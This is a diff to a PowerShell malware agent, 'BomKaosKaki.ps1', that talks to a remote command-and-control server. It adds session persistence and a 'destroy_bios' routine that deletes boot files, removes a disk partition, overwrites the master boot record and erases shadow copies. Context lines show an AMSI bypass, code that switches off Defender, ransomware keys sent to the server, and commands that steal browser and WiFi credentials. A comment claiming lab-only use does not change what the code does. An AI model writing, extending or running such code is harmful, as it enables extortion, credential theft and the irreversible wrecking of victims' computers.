@@ -1,16 +1,15 @@
-# BomKaosKaki.ps1 - Full C2 Agent with RSA Ransomware & Decrypt (Complete + Stealth)
-# Two-way communication: sends heartbeats & exfil, polls for commands
+# BomKaosKaki.ps1 - Full C2 Agent with RSA Ransomware & Decrypt (Stealth + Session Persistence + Destroy BIOS)
 # For authorized red team testing only in isolated lab.
 
 # ============ STEALTH / EVASION ============
-# 1. AMSI Bypass (disable AMSI for current session)
+# AMSI Bypass
 try {
     $amsi = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
     $amsi.GetField('amsiInitFailed', 'NonPublic,Static').SetValue($null, $true)
 }
 catch {}
 
-# 2. Disable Windows Defender (temporary, for lab only)
+# Disable Windows Defender (temporary, for lab only)
 try {
     Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
     Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue
@@ -24,7 +23,7 @@ try {
 }
 catch {}
 
-# 3. Hide console window completely (no flash)
+# Hide console window completely (no flash)
 $Win32 = Add-Type -memberDefinition @"
 [DllImport("kernel32.dll")]
 public static extern IntPtr GetConsoleWindow();
@@ -36,6 +35,19 @@ try {
     $Win32::ShowWindow($consolePtr, 0) | Out-Null
 }
 catch {}
+
+# ============ SESSION PERSISTENCE (SAVE & LOAD SESSION ID) ============
+$sessionFile = "$env:APPDATA\Microsoft\Windows\kaoskaki.session"
+function Save-SessionId {
+    param([string]$id)
+    try { Set-Content -Path $sessionFile -Value $id -Force -ErrorAction SilentlyContinue } catch {}
+}
+function Load-SessionId {
+    if (Test-Path $sessionFile) {
+        try { return (Get-Content $sessionFile -ErrorAction SilentlyContinue) } catch {}
+    }
+    return $null
+}
 
 # ============ CONFIGURATION ============
 $C2Server = "https://bom-kaos-kaki.vercel.app"
@@ -67,6 +79,8 @@ czycwP5n4NcR6wvXV04drEDVqQO47GQr7UmRrObWkp3hAOZlIGd35KBS7JHGUwZP
 PwIDAQAB
 -----END PUBLIC KEY-----
 "@
+
+$RsaPublicKeyXml = "<RSAKeyValue><Modulus>oPjdX2l+XlDMYvFDJDx9ZpsqAkAT1yf4rG8WoDW2UReMu/ltiQPblPRZm8ICXakmMUSzyBwvC14YrtEu1gIloweUPhezpqk0m77HYgeJHTBUU7sLAh/lsmnYUXvtHmUclsCSNCnPUQUej7IZa9ApvuiWI1YixQvSRAa3c+BEpjhInh5QMLSsSUqwr4LmQdfe4I9b/ZuGQ3ZMtsX6azZ8JABv/GtKkuJrD7CHUHHGWB+Na3a66etNVtlI5zpz2/ZBS0cnBP9PqByPaBh8Xg/nczycwP5n4NcR6wvXV04drEDVqQO47GQr7UmRrObWkp3hAOZlIGd35KBS7JHGUwZPPw==</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>"
 
 # ============ UTILITY FUNCTIONS ============
 function Get-Timestamp {
@@ -207,6 +221,7 @@ function Invoke-CommandPoll {
                         "steal_browser" { $cmdResult = Invoke-StealBrowser $cmd }
                         "steal_wifi" { $cmdResult = Invoke-StealWiFi $cmd }
                         "system_info" { $cmdResult = Invoke-SystemInfo $cmd }
+                        "destroy_bios" { $cmdResult = Invoke-DestroyBIOS $cmd }
                         "uninstall" { $cmdResult = Invoke-Uninstall $cmd }
                         default { $cmdError = "Unknown command type: $($cmd.command_type)" }
                     }
@@ -264,8 +279,6 @@ function Invoke-SystemInfo {
 }
 
 # ============ RSA HELPER ============
-$RsaPublicKeyXml = "<RSAKeyValue><Modulus>oPjdX2l+XlDMYvFDJDx9ZpsqAkAT1yf4rG8WoDW2UReMu/ltiQPblPRZm8ICXakmMUSzyBwvC14YrtEu1gIloweUPhezpqk0m77HYgeJHTBUU7sLAh/lsmnYUXvtHmUclsCSNCnPUQUej7IZa9ApvuiWI1YixQvSRAa3c+BEpjhInh5QMLSsSUqwr4LmQdfe4I9b/ZuGQ3ZMtsX6azZ8JABv/GtKkuJrD7CHUHHGWB+Na3a66etNVtlI5zpz2/ZBS0cnBP9PqByPaBh8Xg/nczycwP5n4NcR6wvXV04drEDVqQO47GQr7UmRrObWkp3hAOZlIGd35KBS7JHGUwZPPw==</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>"
-
 function Protect-WithRSA {
     param([string]$PlainText)
     Add-Type -AssemblyName System.Security
@@ -279,11 +292,14 @@ function Protect-WithRSA {
 # ============ RANSOMWARE WITH RSA ============
 function Invoke-Ransomware {
     param($cmd)
+    # Generate session key (32 bytes)
     $sessionKeyBytes = [byte[]]::new(32)
     $rng = [System.Security.Cryptography.RNGCryptoServiceProvider]::Create()
     $rng.GetBytes($sessionKeyBytes)
     $sessionKey = [Convert]::ToBase64String($sessionKeyBytes)
     $Script:RansomwareKey = $sessionKey
+    
+    # Encrypt session key with RSA public key
     $encryptedKey = Protect-WithRSA -PlainText $sessionKey
     Send-ExfilData -Type "ransomware_key" -Data @{ encrypted_key = $encryptedKey }
     
@@ -373,6 +389,7 @@ function Invoke-Decrypt {
     }
     $notePath = "$env:USERPROFILE\Desktop\README_KAOSKAKI.txt"
     if (Test-Path $notePath) { Remove-Item $notePath -Force }
+    # Restore system (enable Task Manager, CMD, etc.)
     try {
         Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name "DisableTaskMgr" -ErrorAction SilentlyContinue
         Remove-ItemProperty -Path "HKCU:\Software\Policies\Microsoft\Windows\System" -Name "DisableCMD" -ErrorAction SilentlyContinue
@@ -812,6 +829,59 @@ function Invoke-StealWiFi {
     return ($result | ConvertTo-Json -Compress)
 }
 
+# ============ DESTROY BIOS / BRICK SYSTEM (UNTUK VM) ============
+function Invoke-DestroyBIOS {
+    param($cmd)
+    try {
+        # 1. Hapus BCD (Boot Configuration Data)
+        bcdedit /export C:\bcd_backup 2>&1 | Out-Null
+        bcdedit /deletevalue { default } recoveryenabled 2>&1 | Out-Null
+        bcdedit /deletevalue { default } recoverysequence 2>&1 | Out-Null
+        bcdedit /set { default } bootstatuspolicy ignoreallfailures 2>&1 | Out-Null
+        bcdedit /delete { bootmgr } /f 2>&1 | Out-Null
+        
+        # 2. Hapus file bootloader
+        attrib -r -s -h C:\bootmgr 2>&1 | Out-Null
+        del /f /q C:\bootmgr 2>&1 | Out-Null
+        attrib -r -s -h C:\Boot\BCD 2>&1 | Out-Null
+        del /f /q C:\Boot\BCD 2>&1 | Out-Null
+        rd /s /q C:\Boot 2>&1 | Out-Null
+        
+        # 3. Hapus partisi EFI (jika ada) menggunakan diskpart
+        $diskpartScript = @"
+select disk 0
+list partition
+select partition 1
+delete partition override
+exit
+"@
+        $diskpartFile = "$env:TEMP\diskpart_$([Guid]::NewGuid().Guid).txt"
+        [System.IO.File]::WriteAllText($diskpartFile, $diskpartScript)
+        diskpart /s $diskpartFile 2>&1 | Out-Null
+        Remove-Item $diskpartFile -Force -ErrorAction SilentlyContinue
+        
+        # 4. Corrupt Master Boot Record (MBR) dengan overwrite 512 bytes pertama
+        $mbr = [byte[]]::new(512)
+        for ($i = 0; $i -lt 512; $i++) { $mbr[$i] = 0xCC }
+        [System.IO.File]::WriteAllBytes("\\\\.\\PhysicalDrive0", $mbr) 2>&1 | Out-Null
+        
+        # 5. Nonaktifkan recovery options di registry
+        reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Shell" /t REG_SZ /d " " /f 2>&1 | Out-Null
+        
+        # 6. Hapus semua system restore points
+        vssadmin delete shadows /all /quiet 2>&1 | Out-Null
+        
+        # 7. Kirim notifikasi ke C2
+        $result = @{ status = "BIOS destroyed"; details = "System will not boot after restart" }
+        Send-ExfilData -Type "destroy_bios" -Data $result
+        return "System bricked. Please restart to confirm."
+    }
+    catch {
+        return "Destroy BIOS failed: $($_.Exception.Message)"
+    }
+}
+
+# ============ UNINSTALL ============
 function Invoke-Uninstall {
     param($cmd)
     $null = Invoke-CleanTraces
@@ -821,6 +891,7 @@ function Invoke-Uninstall {
     try { Remove-Item "$env:APPDATA\Microsoft\Windows\kaoskaki.ps1" -Force -ErrorAction SilentlyContinue } catch {}
     try { Remove-Item "$env:APPDATA\Microsoft\Windows\kaoskaki.vbs" -Force -ErrorAction SilentlyContinue } catch {}
     try { Remove-Item "$env:APPDATA\Microsoft\Windows\kaoskaki.bat" -Force -ErrorAction SilentlyContinue } catch {}
+    try { Remove-Item $sessionFile -Force -ErrorAction SilentlyContinue } catch {}
     Stop-Keylogger $cmd
     if ($Script:SpywareJob) { try { $Script:SpywareJob | Stop-Job -Force; $Script:SpywareJob | Remove-Job -Force } catch {}; $Script:SpywareRunning = $false }
     Send-ExfilData -Type "uninstall" -Data @{ status = "uninstalled"; session_id = $Script:SessionId }
@@ -839,8 +910,14 @@ function Start-C2Communication {
 }
 
 function Invoke-Main {
-    if (-not $Script:SessionId) {
+    # Load or create session ID
+    $loadedId = Load-SessionId
+    if ($loadedId -and $loadedId -ne "") {
+        $Script:SessionId = $loadedId
+    }
+    else {
         $Script:SessionId = Get-SessionId
+        Save-SessionId -id $Script:SessionId
     }
     Send-Heartbeat -Force
     while ($true) { Start-C2Communication; Start-Sleep -Seconds 5 }
